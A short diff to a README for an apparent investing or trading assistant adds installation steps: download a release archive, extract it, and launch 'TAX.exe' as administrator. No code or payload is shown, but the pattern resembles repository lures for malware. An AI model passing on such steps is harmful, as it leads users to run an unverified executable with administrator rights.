@@ -67,7 +67,9 @@ Whether you're a casual investor or a professional trader, this assistant makes 
 
 ## 🛠 Installation
 
-
+1. ✅ **Download the latest release** from the [Releases](../../releases).
+2. 📁 **Extract Files**: Unzip the archive to a secure folder.
+3. 🟢 **Run**: Launch `TAX.exe` as administrator.
 
 ---
 
